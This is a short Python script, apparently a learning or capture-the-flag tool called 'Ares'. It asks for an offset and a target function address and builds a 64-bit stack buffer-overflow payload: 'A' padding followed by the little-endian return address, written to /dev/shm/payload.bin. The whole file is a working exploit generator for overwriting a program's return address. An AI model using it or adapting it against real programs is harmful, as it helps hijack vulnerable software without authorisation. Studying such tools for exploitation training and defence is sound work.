#!/usr/bin/python3

print("\nAres only generates payloads using Little-endian Byte Order. This is the most common endianness for 64-Bit binaries.\n")
print("\n[!] Tip: *If* the binary uses rbp, ensure that those extra 8 Bytes are included in the Offset size.\n")

offset = input("Enter the size of your Offset in Bytes: ")
address = input("Enter the address of the target function in Hex (e.g. 0x400646): ")

padding = b'A' * int(offset)
addr_int = int(address, 16) # Convert the string to Base-16 integer (i.e. Hexadecmial)
little_endian = addr_int.to_bytes(8, byteorder='little')  # 8 bytes = 64-bit

payload = padding + little_endian

print("\nCreating a payload for a 64-Bit binary & saving it to /dev/shm/payload.bin\n")

with open('/dev/shm/payload.bin', 'wb') as f:
    f.write(payload)
